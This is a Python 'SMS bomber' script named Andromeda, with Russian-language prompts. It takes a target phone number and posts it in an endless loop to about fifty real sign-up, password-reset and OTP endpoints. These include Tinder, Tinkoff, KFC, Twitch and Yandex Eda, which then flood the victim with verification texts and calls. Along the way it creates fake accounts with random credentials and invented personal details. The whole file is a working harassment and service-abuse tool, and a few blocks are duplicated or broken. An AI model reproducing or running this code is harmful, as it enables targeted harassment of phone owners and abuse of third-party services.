import requests, random, datetime, sys, time, argparse, os, uuid
from colorama import init, Fore, Back, Style

banner = """
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
°                                                °
° [✓] Name: Andromeda                             °
°                                                °
° [✓] Have Services: 1001                        °
°                                                °
° [✓] Created by: @boy_with_a_pipe                 °
°                                                °
° [✓] Telegram channel:                         °
°                                                °
° [✓] Version: 1.1.4 micropath 10.7             °
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
"""

print(Fore.GREEN + banner + Style.RESET_ALL)
_phone = input('Введи номер для атаки (79xxxxxxxxx)-->> ')

out_time = 0.5

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0

while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		site = 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
		requests.post(site, data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, timeout=1)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Grab отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://moscow.rutaxi.ru/ajax_keycode.html'
		requests.post(site, data={'l': _phone9}, timeout=out_time).json()["res"]
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' RuTaxi отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://belkacar.ru/get-confirmation-code'
		requests.post(site, data={'phone': _phone}, headers={}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' BelkaCar отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site ='https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
		requests.post(site, data={'phone_number': _phone}, headers={}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Tinder отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site ='https://app.karusel.ru/api/v1/phone/'
		requests.post(site, data={'phone': _phone}, headers={}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Karusel отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.tinkoff.ru/v1/sign_up'
		requests.post(site, data={'phone': '+'+_phone}, headers={}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Tinkoff отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.mtstv.ru/v1/users'
		requests.post(site, json={'msisdn': _phone}, headers={}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' MTS отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://youla.ru/web-api/auth/request_code'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Youla отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://pizzahut.ru/account/password-reset'
		requests.post(site, data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' PizzaHut отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.rabota.ru/remind'
		requests.post(site, data={'credential': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Rabota отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://rutube.ru/api/accounts/sendpass/phone'
		requests.post(site, data={'phone': '+'+_phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Rutube отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.citilink.ru/registration/confirm/phone/+'
		requests.post(site+_phone+'/', timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Citilink отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')		

	try:
		site = 'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php'
		requests.post(site, data={'name': _name,'phone': _phone, 'promo': 'yellowforma'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Smsint отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.oyorooms.com/api/pwa/generateotp?phone='
		requests.get(site+_phone9+'&country_code=%2B7&nod=4&locale=en', timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' oyorooms отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp'
		requests.post(site, params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' MVideo отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://newnext.ru/graphql'
		requests.post(site, json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' newnext отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.sunlight.net/v3/customers/authorization/'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Sunlight отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/'
		requests.post(site, json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' alpari отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://lk.invitro.ru/lk2/lka/patient/refreshCode'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Invitro отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://online.sbis.ru/reg/service/'
		requests.post(site, json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Sberbank отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://ib.psbank.ru/api/authentication/extendedClientAuthRequest'
		requests.post(site, json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Psbank отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Beltelcom отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://app.karusel.ru/api/v1/phone/'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Karusel отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms'
		requests.post(site, json={'phone': '+' + _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' KFC отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.carsmile.com/'
		requests.post(site, json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' carsmile отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.citilink.ru/registration/confirm/phone/+'
		requests.post(site + _phone + '/', timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Citilink отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.delitime.ru/api/v2/signup'
		requests.post(site, data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Delitime отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://findclone.ru/register'
		requests.get(site, params={'phone': '+' + _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' findclone звонок отправлен!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://guru.taxi/api/v1/driver/session/verify'
		requests.post(site, json={"phone": {"code": 1, "number": _phone}}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Guru отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.icq.com/smsreg/requestPhoneValidation.php'
		requests.post(site, data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' ICQ отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://terra-1.indriverapp.com/api/authorization?locale=ru'
		requests.post(site, data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' InDriver отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://lk.invitro.ru/sp/mobileApi/createUserByPassword'
		requests.post(site, data={"password": password, "application": "lkp", "login": "+" + _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Invitro отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://ube.pmsm.org.ru/esb/iqos-phone/validate'
		requests.post(site, json={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Pmsm отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.ivi.ru/mobileapi/user/register/phone/v6'
		requests.post(site, data={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' IVI отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://lenta.com/api/v1/authentication/requestValidationCode'
		requests.post(site, json={'phone': '+' + self.formatted_phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Lenta отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://cloud.mail.ru/api/v2/notify/applink'
		requests.post(site, json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Mail.ru отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode'
		requests.post(site, params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' MVideo отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone'
		requests.post(site, data={"st.r.phone": "+" + _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' OK отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://plink.tech/register/'
		requests.post(site, json={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Plink отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code'
		requests.post(site, json={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' qlean отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'http://smsgorod.ru/sendsms.php'
		requests.post(site, data={"number": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' SMSgorod отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
		requests.post(site, data={'phone_number': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Tinder отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://passport.twitch.tv/register?trusted_request=true'
		requests.post(site, json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Twitch отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://cabinet.wi-fi.ru/api/auth/by-sms'
		requests.post(site, data={'msisdn': _phone},headers={'App-ID': 'cabinet'}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' CabWiFi отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api.wowworks.ru/v2/site/send-code'
		requests.post(site, json={"phone": _phone, "type": 2}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' wowworks отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://eda.yandex/api/v1/user/request_authentication_code'
		requests.post(site, json={"phone_number": "+" + _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Eda.Yandex отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://youla.ru/web-api/auth/request_code'
		requests.post(site, data={'phone': _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Youla отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/'
		requests.post(site, json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Alpari отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode'
		requests.post(site, data={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' SMS отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')

	try:
		site = 'https://www.delivery-club.ru/ajax/user_otp'
		requests.post(site, data={"phone": _phone}, timeout=out_time)
		print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' Delivery отправлено!')
	except:
		print(Fore.RED + '[-]' + Style.RESET_ALL + ' Не отправлено!')



	try:
		iteration += 2
		print((Back.GREEN + '{} круг пройден.').format(iteration) + Style.RESET_ALL)
	except:
		break
